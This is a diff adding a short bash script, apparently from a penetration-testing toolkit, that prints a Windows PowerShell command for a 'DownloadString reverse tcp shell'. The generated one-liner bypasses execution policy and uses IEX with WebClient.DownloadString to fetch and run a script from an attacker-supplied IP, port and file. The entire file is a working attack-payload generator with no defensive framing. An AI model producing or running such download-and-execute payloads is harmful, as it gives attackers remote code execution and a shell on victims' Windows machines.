@@ -1,0 +1,23 @@
+#!/bin/bash
+
+function Craft_DownloadString_reverse_shell(){
+
+	if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]
+        then
+                printf "Auto-gen Windows DownloadString reverse tcp shell\n"
+                printf "Usage bash windows_ps1-download-string <attacker-server-ip> <port> <attacker-webfile>\n"
+                exit
+        fi
+
+        rhost="$1"
+        rport="$2"
+	rfile="$3"
+
+	printf "\n"
+	printf "powershell -ExecutionPolicy Bypass -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$rhost:$rport/$rfile');\""
+	printf "\n\n[\e[0;32m+\e[0m] Payload created.\n"
+
+
+}
+
+Craft_DownloadString_reverse_shell "$1" "$2" "$3"
